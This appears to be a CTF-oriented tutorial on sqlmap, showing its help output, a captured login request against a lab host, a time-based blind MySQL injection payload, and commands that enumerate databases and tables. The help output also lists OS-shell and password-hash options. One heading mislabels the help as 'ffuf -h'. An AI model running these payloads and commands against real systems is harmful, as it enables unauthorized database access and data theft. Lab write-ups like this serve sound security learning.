# sqlmap

The sqlmap tool makes sql injection and detection very trivial. I use this tool in capture the flag events to dump sql tables and get information. This tool also detects and reports what database management system is being used. Until recently, injection and sql injection has been the top vulnerability in the OWASP Top 10 list. This tool makes it easy to detect and fix sql injection.

## Usage

Running `ffuf -h` provided the following output:

```bash
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

## Examples

### With Sample Request

When I see a login form and I want to test if it vulnerable to a sql injection attack, I'll capture a login request using the developer toolbar or Burp. I'll copy that request to a file and name it `request.txt`. The sqlmap tool will take care of the rest. Here is a sample request that I have saved in the `request.txt` file:

```
POST /api/login HTTP/1.1
Host: 10.10.191.223
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://target.thm
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&password=password
```

Now running the following command will check if this form is vulnerable to a sql injection attack:

`sqlmap -r request.txt`

The sqlmap tool will examine the request and check each parameter being sent in the request. For this example it will check if username is vulnerable to a sql injection attack then it will run the same test for the password parameter. It tests the parameters by checking if it can get a timeout for the request. It will add a delay of like five seconds to each parameter request and if the response takes more than five seconds, it will know that the parameter is vulnerable to the attack and what type of database the site is using.

Some of the output from the above request and sqlmap run is as follows:

```bash
[04:55:26] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 158 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 6950 FROM (SELECT(SLEEP(5)))pDlF) AND 'Rvtz'='Rvtz&password=password
---
[04:55:47] [INFO] the back-end DBMS is MySQL
```

As mentioned before, the username parameter is vulnerable and the backend is MySQL.

### Getting Databases

Now that I know that the username parameter is vulnerable, I can start to get useful information. First, I need to know what databases are in this instance of MySQL. I run the following command:

`sqlmap -r request.txt --dbs`

After a few minutes I got the following output:

```bash
available databases [2]:
[*] gallery_db
[*] information_schema
```

There are two databases, I can now select a database and get all the tables for that database. In my example, I only care about the gallery database. So I run the following command to get all the tables in the `gallery_db` database:

`sqlmap -r request.txt -D gallery_db --tables`
